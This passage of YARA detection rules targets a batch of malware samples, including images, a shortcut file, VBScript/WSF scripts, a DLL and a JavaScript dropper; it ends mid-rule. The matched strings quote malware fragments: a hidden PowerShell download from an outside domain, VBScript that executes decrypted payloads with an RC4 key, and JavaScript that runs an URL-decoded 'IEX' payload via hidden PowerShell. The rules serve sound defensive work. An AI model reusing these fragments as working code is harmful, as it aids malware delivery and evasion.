      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:f1202bc8-df3e-9848-8f03-731cc319e1f2\" stEvt:when=\"2019-04-09T10:54:06+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "4'AKBE:\\$" fullword ascii /* score: '10.00'*/
      $s5 = "* 9Y!D" fullword ascii /* score: '9.00'*/
      $s6 = "019-04-09T10:54:06+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s7 = "')%I%)$" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 700KB and
      all of them
}

rule sig_6bb9d89f3f91806f23d084d01a0ee6fb3d37f32faf685406212d3a153951d672_6bb9d89f {
   meta:
      description = "_subset_batch - file 6bb9d89f3f91806f23d084d01a0ee6fb3d37f32faf685406212d3a153951d672_6bb9d89f.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6bb9d89f3f91806f23d084d01a0ee6fb3d37f32faf685406212d3a153951d672"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:bb3df0f1-0d6c-fd48-b845-7955f81640eb\" stEvt:when=\"2019-04-09T10:54:11+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T10:54:11+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 800KB and
      all of them
}

rule sig_7c1b03e1274c32fdde2257d72a914173da37fbbfc9ba0ee4d7ef8bdc95d9b273_7c1b03e1 {
   meta:
      description = "_subset_batch - file 7c1b03e1274c32fdde2257d72a914173da37fbbfc9ba0ee4d7ef8bdc95d9b273_7c1b03e1.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7c1b03e1274c32fdde2257d72a914173da37fbbfc9ba0ee4d7ef8bdc95d9b273"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:3b5782e3-e8b7-7649-a26d-dacea7501c6f\" stEvt:when=\"2019-04-09T10:54:08+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T10:54:08+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s5 = "* AII7)F" fullword ascii /* score: '9.00'*/
      $s6 = "I%yJRI%)$" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule sig_5abf4eb124739a539afc1a24936d3ffc893ebd8c685c97851a0a040ce1895eda_5abf4eb1 {
   meta:
      description = "_subset_batch - file 5abf4eb124739a539afc1a24936d3ffc893ebd8c685c97851a0a040ce1895eda_5abf4eb1.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5abf4eb124739a539afc1a24936d3ffc893ebd8c685c97851a0a040ce1895eda"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:25b95a8e-e84f-3849-a474-7d16975f2f92\" stEvt:when=\"2019-04-09T10:50:08+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T10:50:08+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_70aa42fc7256feec93103a4235f1b0a3caa72ab2d807ae7c7c25f805f1ecb432_70aa42fc {
   meta:
      description = "_subset_batch - file 70aa42fc7256feec93103a4235f1b0a3caa72ab2d807ae7c7c25f805f1ecb432_70aa42fc.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "70aa42fc7256feec93103a4235f1b0a3caa72ab2d807ae7c7c25f805f1ecb432"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:7444ab39-8a88-104f-9770-578fae731466\" stEvt:when=\"2019-04-09T10:54:12+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T10:54:12+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_47e99802fcb41ec5454322fc2dc6e8a961a5f0a5be0ca8668dffb491f8470c26_47e99802 {
   meta:
      description = "_subset_batch - file 47e99802fcb41ec5454322fc2dc6e8a961a5f0a5be0ca8668dffb491f8470c26_47e99802.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "47e99802fcb41ec5454322fc2dc6e8a961a5f0a5be0ca8668dffb491f8470c26"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "Evt:instanceID=\"xmp.iid:3aef3d8c-ad87-a648-9652-4f3447fbd9c4\" stEvt:when=\"2019-04-09T11:19:01+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s3 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s4 = "019-04-09T11:19:01+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s5 = "TDBJ^Te9* " fullword ascii /* score: '8.00'*/
      $s6 = "%KhJuI%('" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_34623c84ace80c729655dcfb2ad3025065ca04d5c4dc51f9446e715bbe2bf5a4_34623c84 {
   meta:
      description = "_subset_batch - file 34623c84ace80c729655dcfb2ad3025065ca04d5c4dc51f9446e715bbe2bf5a4_34623c84.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "34623c84ace80c729655dcfb2ad3025065ca04d5c4dc51f9446e715bbe2bf5a4"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "Evt:instanceID=\"xmp.iid:45038ee5-ccf2-384b-8e91-8fa48214d85f\" stEvt:when=\"2019-04-09T11:19:08+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s3 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s4 = "019-04-09T11:19:08+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s5 = "* ASIK(" fullword ascii /* score: '9.00'*/
      $s6 = "BJbS'* $" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 800KB and
      all of them
}

rule sig_44c1122533ac33df8620caf6670df45f1e1a3a46a87e1a74325ea997e83d29f9_44c11225 {
   meta:
      description = "_subset_batch - file 44c1122533ac33df8620caf6670df45f1e1a3a46a87e1a74325ea997e83d29f9_44c11225.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "44c1122533ac33df8620caf6670df45f1e1a3a46a87e1a74325ea997e83d29f9"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s3 = "019-04-09T10:50:10+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s4 = "Evt:instanceID=\"xmp.iid:e54cdc75-ca9d-574d-9448-4ecaff8e68b5\" stEvt:when=\"2019-04-09T10:50:10+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule sig_6c7de4dabece97cdda3735b6ca4040f13e5fe402e24749ab2f7574d0e31e73b8_6c7de4da {
   meta:
      description = "_subset_batch - file 6c7de4dabece97cdda3735b6ca4040f13e5fe402e24749ab2f7574d0e31e73b8_6c7de4da.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6c7de4dabece97cdda3735b6ca4040f13e5fe402e24749ab2f7574d0e31e73b8"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:8b5611ff-f032-5349-af80-e8308f5b524e\" stEvt:when=\"2019-04-09T10:50:18+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T10:50:18+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 800KB and
      all of them
}

rule sig_104d6681a050999fcfbaf654cd50b20c3085a6d8958aa557918c0bd591c87cf8_104d6681 {
   meta:
      description = "_subset_batch - file 104d6681a050999fcfbaf654cd50b20c3085a6d8958aa557918c0bd591c87cf8_104d6681.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "104d6681a050999fcfbaf654cd50b20c3085a6d8958aa557918c0bd591c87cf8"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:bc30c72b-75bc-0d4c-b1b8-613965c2d37b\" stEvt:when=\"2019-04-09T11:10:50+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T11:10:50+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s5 = "I2H%yIEI%);TRIM" fullword ascii /* score: '8.00'*/
      $s6 = "IKBhD%E%1I" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_6920ce0fb2906069af4037d44c873b8122fd6be525791138beb82cb79a73b5d5_6920ce0f {
   meta:
      description = "_subset_batch - file 6920ce0fb2906069af4037d44c873b8122fd6be525791138beb82cb79a73b5d5_6920ce0f.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6920ce0fb2906069af4037d44c873b8122fd6be525791138beb82cb79a73b5d5"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:e5ae4bb5-eb31-7d40-a1e9-d6fe9c915243\" stEvt:when=\"2019-04-09T11:10:48+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T11:10:48+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 800KB and
      all of them
}

rule sig_7b9b04fb87b23fe8b89a63ad0c71d342f5f683f09803029733de1afcf371074e_7b9b04fb {
   meta:
      description = "_subset_batch - file 7b9b04fb87b23fe8b89a63ad0c71d342f5f683f09803029733de1afcf371074e_7b9b04fb.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7b9b04fb87b23fe8b89a63ad0c71d342f5f683f09803029733de1afcf371074e"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s3 = "Evt:instanceID=\"xmp.iid:7c19acdd-7bdc-cb4e-8c7b-791f139f7db2\" stEvt:when=\"2019-04-09T10:50:31+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s4 = "019-04-09T10:50:31+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 700KB and
      all of them
}

rule sig_0ce98f9ce5438b7b444e90a9b7c54e615a604577c37d93ebe4c28d662ffcb038_0ce98f9c {
   meta:
      description = "_subset_batch - file 0ce98f9ce5438b7b444e90a9b7c54e615a604577c37d93ebe4c28d662ffcb038_0ce98f9c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0ce98f9ce5438b7b444e90a9b7c54e615a604577c37d93ebe4c28d662ffcb038"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "Evt:instanceID=\"xmp.iid:e355b51d-4fa7-1147-a7ea-cf14781502cc\" stEvt:when=\"2019-04-09T11:18:58+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s3 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s4 = "019-04-09T11:18:58+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s5 = "a:hO)%I%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_54c16220a473ee51f5ddbc6f2836a41c573891014922fedb9c744bd0fb70733b_54c16220 {
   meta:
      description = "_subset_batch - file 54c16220a473ee51f5ddbc6f2836a41c573891014922fedb9c744bd0fb70733b_54c16220.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "54c16220a473ee51f5ddbc6f2836a41c573891014922fedb9c744bd0fb70733b"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "Evt:instanceID=\"xmp.iid:af9e2597-86ae-1143-895b-65788e9932ef\" stEvt:when=\"2019-04-09T11:18:57+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s3 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s4 = "019-04-09T11:18:57+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_5a7f24e9f5d056ccd795e954c1cd17eeabcc829f9316cd55635f63eed730f5d5_5a7f24e9 {
   meta:
      description = "_subset_batch - file 5a7f24e9f5d056ccd795e954c1cd17eeabcc829f9316cd55635f63eed730f5d5_5a7f24e9.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5a7f24e9f5d056ccd795e954c1cd17eeabcc829f9316cd55635f63eed730f5d5"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "-09T11:19+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"saved\" stEv" ascii /* score: '9.00'*/
      $s3 = "IRcG%$/" fullword ascii /* score: '9.00'*/
      $s4 = "0%I%/*" fullword ascii /* score: '8.00'*/
      $s5 = "nceID=\"xmp.iid:dc807628-5ca0-5147-b75e-12cc9995307c\" stEvt:when=\"2019-04-09T11:19+03:00\" stEvt:softwareAgent=\"Adobe Photosh" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule sig_2f329a1171d2c6b1471604bf76157b6487c3e59d21bf4a0856e29dc4ba8753cb_2f329a11 {
   meta:
      description = "_subset_batch - file 2f329a1171d2c6b1471604bf76157b6487c3e59d21bf4a0856e29dc4ba8753cb_2f329a11.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2f329a1171d2c6b1471604bf76157b6487c3e59d21bf4a0856e29dc4ba8753cb"
   strings:
      $x1 = "$ProgressPreference = 'SilentlyContinue';$a='https:';$b='C:\\Users\\';$c='C:\\Windows\\';iw''r $a//nr3cgovpk.org/download/fetch/" wide /* score: '52.00'*/
      $x2 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '31.00'*/
      $s3 = "powershell.exe" fullword wide /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = " powershell.exe" fullword wide /* score: '24.00'*/
      $s5 = "B..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s6 = "v1.0 (C:\\Windows\\System32\\WindowsPowerShell)" fullword wide /* score: '20.00'*/
      $s7 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule sig_0c501133be945f70adce76987e1afee2838cc234ddf9dcde95540a50d20894f6_0c501133 {
   meta:
      description = "_subset_batch - file 0c501133be945f70adce76987e1afee2838cc234ddf9dcde95540a50d20894f6_0c501133.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0c501133be945f70adce76987e1afee2838cc234ddf9dcde95540a50d20894f6"
   strings:
      $s1 = "logJ;8zB" fullword ascii /* score: '9.00'*/
      $s2 = "%W%* Y$(" fullword ascii /* score: '9.00'*/
      $s3 = "\\BliYEi.UIe\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule sig_0d59e74e67cff0cdbf02aadb53ace367c595788f0d31326b1422c8ec12cc0c5d_0d59e74e {
   meta:
      description = "_subset_batch - file 0d59e74e67cff0cdbf02aadb53ace367c595788f0d31326b1422c8ec12cc0c5d_0d59e74e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0d59e74e67cff0cdbf02aadb53ace367c595788f0d31326b1422c8ec12cc0c5d"
   strings:
      $s1 = "Execute YnLmKNxyhA(ogbwMovwfh)" fullword ascii /* score: '18.00'*/
      $s2 = "            idx = ((i - 1) Mod Len(keyStr)) + 1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x676f and filesize < 40KB and
      all of them
}

rule sig_10a715b42d92880fcbb99656135a394556e5b3603c2ef75305d90da6be3a095d_10a715b4 {
   meta:
      description = "_subset_batch - file 10a715b42d92880fcbb99656135a394556e5b3603c2ef75305d90da6be3a095d_10a715b4.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "10a715b42d92880fcbb99656135a394556e5b3603c2ef75305d90da6be3a095d"
   strings:
      $s1 = "Execute pzEcanqjFy(jTfUEZKyCj)" fullword ascii /* score: '14.00'*/
      $s2 = "            idx = ((i - 1) Mod Len(keyStr)) + 1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x546a and filesize < 40KB and
      all of them
}

rule sig_176aa29bd20f707a7edaedec37b686987c9047fa146d82cae3bce4dedb14ca70_176aa29b {
   meta:
      description = "_subset_batch - file 176aa29bd20f707a7edaedec37b686987c9047fa146d82cae3bce4dedb14ca70_176aa29b.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "176aa29bd20f707a7edaedec37b686987c9047fa146d82cae3bce4dedb14ca70"
   strings:
      $s1 = "Execute fHePsCMEmw(HrnPHKWInf)" fullword ascii /* score: '18.00'*/
      $s2 = "            idx = ((i - 1) Mod Len(keyStr)) + 1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7248 and filesize < 40KB and
      all of them
}

rule sig_5d6d94e37704e462c9ca38265c44f58aac507c7415dd0289720642d65a94d3a0_5d6d94e3 {
   meta:
      description = "_subset_batch - file 5d6d94e37704e462c9ca38265c44f58aac507c7415dd0289720642d65a94d3a0_5d6d94e3.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5d6d94e37704e462c9ca38265c44f58aac507c7415dd0289720642d65a94d3a0"
   strings:
      $s1 = "Execute BmNAZHBmpu(SOFKrhLBqZ)" fullword ascii /* score: '18.00'*/
      $s2 = "            idx = ((i - 1) Mod Len(keyStr)) + 1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4f53 and filesize < 40KB and
      all of them
}

rule sig_34d518ace15ded0134f2b37104c125a52ba00d8024ccd9a0becf85e1c2754734_34d518ac {
   meta:
      description = "_subset_batch - file 34d518ace15ded0134f2b37104c125a52ba00d8024ccd9a0becf85e1c2754734_34d518ac.wsf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "34d518ace15ded0134f2b37104c125a52ba00d8024ccd9a0becf85e1c2754734"
   strings:
      $s1 = "        z.Run \"cmd /c \"\"\" & w & \"\"\"\", 0, False" fullword ascii /* score: '15.00'*/
      $s2 = "  <script language=\"VBScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_4d5c5c830783bdbae94af1a4e193554244b810d8c58a706f55f48d2e39394cf9_4d5c5c83 {
   meta:
      description = "_subset_batch - file 4d5c5c830783bdbae94af1a4e193554244b810d8c58a706f55f48d2e39394cf9_4d5c5c83.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4d5c5c830783bdbae94af1a4e193554244b810d8c58a706f55f48d2e39394cf9"
   strings:
      $s1 = "Execute decryptedContent" fullword ascii /* score: '23.00'*/
      $s2 = "Dim xmlObject, encryptedBytes, decryptedContent" fullword ascii /* score: '16.00'*/
      $s3 = "decryptedContent = CustomRC4(encryptedBytes, \"cw_0[tlOiLCgL3tb\")" fullword ascii /* score: '16.00'*/
      $s4 = "xmlObject.dataType = \"bin.base64\"" fullword ascii /* score: '14.00'*/
      $s5 = "waitTime = Int((3000 - 500 + 1) * Rnd + 500)" fullword ascii /* score: '12.00'*/
      $s6 = "If Timer > 0 Then Dim tempVar : tempVar = \"Nothing\" : End If" fullword ascii /* score: '11.00'*/
      $s7 = "  Dim cleanedString, tempString" fullword ascii /* score: '11.00'*/
      $s8 = "xmlObject.text = combinedBase64" fullword ascii /* score: '10.00'*/
      $s9 = "encryptedBytes = xmlObject.nodeTypedValue" fullword ascii /* score: '9.00'*/
      $s10 = "For counter = 1 To Int(Rnd() * 10) + 3 : Next" fullword ascii /* score: '8.00'*/
      $s11 = "base64Segments = Array(\"to02\", \"5kMbu\", \"Q0bkSQ\", \"TzWR8\", \"EXtxL4\", \"4CWZ0\", \"w0dG\", \"ND4\", \"4CX4\", \"TqC\", " ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 100KB and
      8 of them
}

rule sig_47d49c240a422993f501f16d6fdb37f9_imphash_ {
   meta:
      description = "_subset_batch - file 47d49c240a422993f501f16d6fdb37f9(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "142466947ea12fd935f8e6920a1416f0055e2cf555dd8fa1b2d3d18bdb7476de"
   strings:
      $s1 = "selfprot.dll" fullword ascii /* score: '23.00'*/
      $s2 = "<\"<&<*<.<2<6<" fullword ascii /* score: '9.00'*/ /* hex encoded string '&' */
      $s3 = "X'RegGetValueW" fullword ascii /* score: '9.00'*/
      $s4 = "rOperation" fullword wide /* score: '9.00'*/
      $s5 = "GetStringProperty " fullword wide /* score: '9.00'*/
      $s6 = "WindowsGetStringRa" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule sig_0f46386e869070789518f9ef7be107a0380faf2976048690b363f725c9fec385_0f46386e {
   meta:
      description = "_subset_batch - file 0f46386e869070789518f9ef7be107a0380faf2976048690b363f725c9fec385_0f46386e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0f46386e869070789518f9ef7be107a0380faf2976048690b363f725c9fec385"
   strings:
      $x1 = "var FC59FC30 = \"Add-Type -AssemblyName System.Web;IEX ([System.Web.HttpUtility]::UrlDecode('%24AMSI+%3d+%22TVqQ%5c%5cM%5c%5c%5c" ascii /* score: '67.00'*/
      $x2 = "AF1CA0E2.SHELLEXECUTE(\"POWERSHELL.EXE\",\"-EXECUTIONPOLICY UNRESTRICTED -WINDOWSTYLE HIDDEN -NOLOGO -COMMAND \" + FC59FC30,\"\"" ascii /* score: '45.00'*/
